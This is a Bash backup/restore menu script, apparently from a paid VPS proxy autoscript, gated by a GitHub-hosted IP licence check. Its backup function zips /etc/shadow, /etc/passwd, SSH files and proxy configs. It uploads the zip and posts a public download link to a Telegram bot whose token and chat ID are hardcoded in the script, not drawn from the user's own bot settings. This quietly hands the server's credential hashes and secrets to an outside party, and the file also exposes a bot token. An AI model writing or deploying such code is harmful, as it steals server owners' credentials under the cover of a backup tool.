#!/bin/bash
#IZIN SCRIPT
MYIP=$(curl -sS ipv4.icanhazip.com)
echo -e "\e[32mloading...\e[0m"
clear
# Valid Script
ipsaya=$(wget -qO- ipinfo.io/ip)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/cyVPN/Azerd/ABSTRAK/REGIST"
checking_sc() {
  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
  if [[ $date_list < $useexp ]]; then
    echo -ne
  else
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e ""
    echo -e "            ${RED}PERMISSION DENIED !${NC}"
    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
    echo -e "             \033[0;33mContact Admin :${NC}"
    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6281332740123"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    exit
  fi
}
checking_sc
clear 

# //
# // backup
function backup(){
# // color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
export CHATID="6617783693"
export KEY="6751589620:AAHwjP6dzZhuqeyUOdYFc6742Q1YUVF1EjM"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
date=$(date +"%Y-%m-%d")
clear
email=$(cat /root/email)
if [[ "$email" = "" ]]; then
clear
echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
echo -e "\033[1;96m    Masukkan Email Untuk Menerima Backup${NC}"
echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
echo -e ""
echo -e "---------------------------------------------------" | lolcat
read -rp "INPUT YOUR EMAIL:   " -e email
echo "$email" > /root/email
fi
clear
################## CMD
fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    done
    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
    tput cnorm
}
#echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp /etc/crontab backup/
cp -r /etc/vmess/ backup/
cp -r /etc/ssh/ backup/
cp -r /etc/vless/ backup/
cp -r /etc/trojan/ backup/
cp -r /etc/limit/vmess/ /root/backup/vmessquota
cp -r /etc/limit/vless/ /root/backup/vlessquota
cp -r /etc/limit/trojan/ /root/backup/trojanquota
cp -r /etc/limit/shadowsocks/ /root/backup/shadowsocksquota
cp -r /etc/kyt/limit/vmess/ip/ /root/backup/vmessip
cp -r /etc/kyt/limit/vless/ip/ /root/backup/vlessip
cp -r /etc/kyt/limit/trojan/ip/ /root/backup/trojanip
cp -r /etc/kyt/limit/shadowsocks/ip/ /root/backup/shadowsocksip
cp -r /etc/shadowsocks/ backup/
cp -r /var/lib/kyt/ backup/kyt 
cp -r /etc/xray backup/xray
cp -r /var/www/html/ backup/html
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" $email
rm -rf /root/backup
rm -r /root/$IP-$date.zip
clear
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="
<code>==============</code>
<code>Detail Backup </code>
<code>==============</code>
<code>DOMAIN       : ${domain}</code>
<code>==============</code>
<code>IP VPS       : ${IP}</code>
<code>==============</code>
<code>Link Backup   :</code> $link
<code>==============</code>
<code>Tanggal : $date</code>
<code>==============</code>
<code>Silahkan copy Link dan restore di VPS baru</code>
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
Domain        : $domain
==================================
"
echo "Silahkan copy Link dan restore di VPS baru"
echo ""
read -p " Press !! [ ENTER ] To Menu"
menu
}
# // restore
function restore(){
clear
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
function notif_restore() {
    green "Notif AddHost Tele"
    sleep 2
    CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="
<code>◇━━━━━━━━━━━━━━◇</code>
<b>  ⚠️ RESTORE NOTIF⚠️</b>
<b>     Detail Restore VPS</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<code>Restore Vps Done</code>
<code>◇━━━━━━━━━━━━━━◇</code>
"

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}
# ==========================================
# Getting
clear
echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
echo -e "\033[1;93m│$NC\e[96;1m      INPUT LINK BACKUP VPS                $NC"
echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
echo -e ""
read -p "input Link backup :  " -e url
echo -e ""
wget -O backup.zip "$url"
unzip backup.zip
rm -f backup.zip
sleep 1
echo Start Restore
cd /root/backup
cp passwd /etc/
cp group /etc/
cp shadow /etc/
cp gshadow /etc/
cp -r kyt /var/lib/
cp -r xray /etc/
cp -r html /var/www/
cp crontab /etc/
cp .ssh.db /etc/ssh/
cp .vmess.db /etc/vmess/
cp .vless.db /etc/vless/
cp .trojan.db /etc/trojan/
cp .shadowsocks.db /etc/shadowsocks/
notif_restore
rm -rf /root/backup
rm -f backup.zip
echo ""
read -p "press !! [ ENTER ] To Menu"
menu
}

# // BOT
export CHATID="6617783693"
export KEY="6751589620:AAHwjP6dzZhuqeyUOdYFc6742Q1YUVF1EjM"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"

grenbo="\e[92;1m"
NC='\033[0m'
clear
echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
echo -e "\033[1;93m│$NC\e[96;1m          MENU MANAGER BACKUP             $NC"
echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
echo -e "\033[1;93m│  ${grenbo}1.${NC} \033[0;36mBACKUP VPS DATA ${NC}"
echo -e "\033[1;93m│  ${grenbo}2.${NC} \033[0;36mRESTORE VPS DATA  ${NC}"
echo -e "\033[1;93m│  ${grenbo}3.${NC} \033[0;36mAUTO BACKUP VPS  ${NC}"
echo -e "\033[1;93m│  ${grenbo}x.${NC} \033[0;36mComeBack${NC}"
echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
echo -e ""
read -p " Select options >>>   "  opt
echo -e   ""
case $opt in
01 | 1) clear ; backup ;;
02 | 2) clear ; restore ;;
03 | 3) clear ; m-auto-bckp ;;
00 | 0) clear ; menu ;;
*) clear ; menu ;;
esac
